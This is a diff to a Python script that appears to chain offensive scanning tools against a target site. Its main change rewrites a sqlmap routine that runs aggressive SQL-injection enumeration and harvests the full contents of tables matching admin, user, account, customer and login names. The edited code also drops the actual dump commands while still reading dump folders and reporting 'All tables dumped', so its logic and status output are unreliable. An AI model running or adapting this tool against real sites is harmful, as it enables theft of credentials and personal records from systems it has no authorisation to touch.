@@ -158,7 +158,7 @@ def run_whatweb(target, output_dir):
     with SUMMARY_LOCK:
         OUTPUT_FILES.append(("Web Fingerprinting (WhatWeb)", whatweb_file))
 
-# ---------------- SQLMap Function (full dump + progress) ----------------
+# ---------------- SQLMap Function (full dump + sensitive contents) ----------------
 def run_sqlmap(target, output_dir):
     base_dir = f"{output_dir}/sqlmap_{TIMESTAMP}"
     os.makedirs(base_dir, exist_ok=True)
@@ -166,75 +166,54 @@ def run_sqlmap(target, output_dir):
     SENSITIVE_TABLES_REGEX = r"admin|admins|user|users|account|accounts|customer|customers|employee|employees|login|logins"
 
     # Step 1: Enumerate databases
-    enum_dbs_cmd = f"sqlmap -u {target} --batch --crawl=3 --level=3 --risk=3 --threads=10 --random-agent --dbs --output-dir={base_dir} -v 3"
+    enum_dbs_cmd = f"sqlmap -u {target} --batch --level=3 --risk=3 --crawl=3 --threads=10 --random-agent --dbs --output-dir={base_dir} -v 3"
     run(enum_dbs_cmd, "SQLMap Database Enumeration", live_output=True)
 
-    # Step 2: Parse databases from SQLMap log files
-    dbs = set()
-    for root, dirs, files in os.walk(base_dir):
-        for file in files:
-            if file.endswith(".txt") or file.endswith(".log"):
-                with open(os.path.join(root, file), "r", errors="ignore") as f:
-                    for line in f:
-                        match = re.search(r"available databases\s*\[(.*?)\]", line, re.IGNORECASE)
-                        if match:
-                            found = [db.strip() for db in match.group(1).split(",")]
-                            dbs.update(found)
+    # Step 2: Find databases from output-dir
+    target_folder = target.replace("://", "_")
+    dump_root = os.path.join(base_dir, target_folder, "dump")
+    dbs = [db for db in os.listdir(dump_root) if os.path.isdir(os.path.join(dump_root, db))] if os.path.exists(dump_root) else []
     dbs = sorted(dbs)
     REPORT_DATA["sqlmap"]["databases"] = dbs
     print(f"[+] Databases found: {dbs}")
 
     # Step 3: Enumerate tables
     db_tables = {}
-    sensitive_info = {}
-    target_folder = target.replace("://", "_")
+    sensitive_info = {}  # Store full contents of sensitive tables
 
-    for db_index, db in enumerate(dbs, start=1):
-        print(f"\n[+] Enumerating tables in database {db_index}/{len(dbs)}: {db}")
-        enum_tables_cmd = f"sqlmap -u {target} --batch -D {db} --tables --output-dir={base_dir} -v 3"
-        output = run(enum_tables_cmd, f"Enumerate Tables in Database: {db}", live_output=True)
-
-        tables = set()
-        for line in output.splitlines():
-            line = line.strip()
-            table_match = re.match(r"\|\s*(\w+)\s*\|", line)
-            if table_match:
-                tables.add(table_match.group(1))
+    total_tables = 0
+    for db in dbs:
+        db_path = os.path.join(dump_root, db)
+        tables = [f[:-4] for f in os.listdir(db_path) if f.endswith(".csv")]
         db_tables[db] = sorted(tables)
-        print(f"[+] Found {len(tables)} tables in {db}: {db_tables[db]}")
+        total_tables += len(tables)
     REPORT_DATA["sqlmap"]["tables"] = db_tables
+    print(f"[+] Found {total_tables} tables across all databases.")
 
-    # Step 4: Dump all tables with progress
-    total_tables = sum(len(t) for t in db_tables.values())
+    # Step 4: Dump all tables and save sensitive tables contents
     current_table_num = 0
-
     for db, tables in db_tables.items():
         for table in tables:
             current_table_num += 1
-            print(f"\n[+] Dumping table {current_table_num}/{total_tables}: {db}.{table}")
+            print(f"\n[+] Processing table {current_table_num}/{total_tables}: {db}.{table}")
 
-            if re.search(SENSITIVE_TABLES_REGEX, table, re.IGNORECASE):
-                count_cmd = f"sqlmap -u {target} --batch -D {db} -T {table} --count --output-dir={base_dir} -v 3"
-                count_output = run(count_cmd, f"SQLMap Row Count for Table: {db}.{table}", live_output=True)
-                row_count = None
-                match = re.search(r"Table '.*?' has (\d+) entries", count_output)
-                if match:
-                    row_count = int(match.group(1))
-                sensitive_info[f"{db}.{table}"] = row_count
-                print(f"[+] Table {db}.{table} has {row_count} rows")
-
-            # Dump table
-            dump_cmd = f"sqlmap -u {target} --batch -D {db} -T {table} --dump --output-dir={base_dir} -v 3"
-            run(dump_cmd, f"SQLMap Dump Table: {db}.{table}", live_output=True)
-
-            internal_csv = os.path.join(base_dir, target_folder, "dump", db, f"{table}.csv")
-            if os.path.exists(internal_csv):
+            table_csv_path = os.path.join(dump_root, db, f"{table}.csv")
+            if os.path.exists(table_csv_path):
+                # Copy CSV to main folder as txt
                 dump_file = os.path.join(base_dir, f"dump_{db}_{table}.txt")
-                shutil.copy(internal_csv, dump_file)
+                shutil.copy(table_csv_path, dump_file)
                 with SUMMARY_LOCK:
                     OUTPUT_FILES.append((f"SQLMap Dump: {db}.{table}", dump_file))
 
+                # If table is sensitive, read full content into REPORT_DATA
+                if re.search(SENSITIVE_TABLES_REGEX, table, re.IGNORECASE):
+                    with open(table_csv_path, "r", errors="ignore") as f:
+                        content = f.read()
+                    sensitive_info[f"{db}.{table}"] = content
+                    print(f"[+] Sensitive table {db}.{table} content stored in memory.")
+
     REPORT_DATA["sqlmap"]["sensitive_tables_info"] = sensitive_info
+    print(f"\n[+] SQLMap scan complete. All tables dumped, sensitive tables stored.")
 
 def run_wpscan(target, output_dir):
     output_file = f"{output_dir}/wpscan_report_{TIMESTAMP}.txt"
@@ -318,6 +297,7 @@ def main():
         ("WPScan Vulnerability Scan", lambda: run_wpscan(target, output_dir))
     ]
 
+    from concurrent.futures import ThreadPoolExecutor, as_completed
     with ThreadPoolExecutor(max_workers=5) as executor:
         futures = {executor.submit(func): name for name, func in fast_tasks}
         for future in as_completed(futures):
